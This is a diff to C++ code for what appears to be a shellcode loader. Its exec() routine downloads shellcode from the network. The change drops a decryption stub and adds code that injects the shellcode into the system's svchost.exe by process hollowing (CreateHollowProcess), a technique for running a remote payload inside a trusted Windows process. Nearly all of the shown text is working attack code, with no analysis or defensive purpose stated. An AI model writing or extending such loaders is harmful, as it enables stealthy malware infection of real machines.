@@ -26,9 +26,6 @@ std::string DownloadShellcode() {
     return result;
 }
 
-std::vector<BYTE> DecryptShellcode(std::string &shellcode) {
-}
-
 void exec() {
     std::string downloadedShellCode = DownloadShellcode();
     if (downloadedShellCode.empty()) {
@@ -38,8 +35,18 @@ void exec() {
         Print("Downloaded shellcode", PRINT_DEBUG);
     }
 
-    std::vector<BYTE> shellcode = DecryptShellcode(downloadedShellCode);
-    // ProcessDoppel()
+    std::vector<BYTE> shellcode(downloadedShellCode.begin(), downloadedShellCode.end());
+
+    char systemPath[MAX_PATH];
+    if(!GetSystemDirectoryA(systemPath, MAX_PATH)) {
+        Print("Failed to get the system directory.", PRINT_ERROR);
+    }
+    char svchostPath[MAX_PATH];
+    if (S_OK != StringCchPrintfA(svchostPath, MAX_PATH, "%s\\svchost.exe", systemPath)) {
+        Print("Failed to build the svchost path.", PRINT_ERROR);
+    }
+
+    CreateHollowProcess(svchostPath, shellcode);
 }
 
 void run() {
